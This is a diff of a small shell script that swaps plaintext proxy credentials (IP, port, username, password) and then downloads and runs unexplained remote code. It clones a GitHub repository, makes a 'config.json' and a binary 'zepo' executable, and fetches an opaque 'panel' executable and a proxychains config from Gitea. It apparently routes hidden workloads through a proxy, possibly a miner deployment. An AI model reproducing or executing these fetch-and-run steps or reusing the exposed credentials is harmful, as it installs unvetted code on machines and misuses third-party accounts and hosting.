@@ -1,7 +1,7 @@
 proxy="38.154.227.167" 
 port="5868" 
-user="ugursfso"  
-pass="wqn60pnk6m95" 
+user="nrrmfinr"  
+pass="9rrin80d68ba" 
 git clone https://github.com/55113110159/render.git && cd render && chmod +x config.json && chmod +x zepo
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
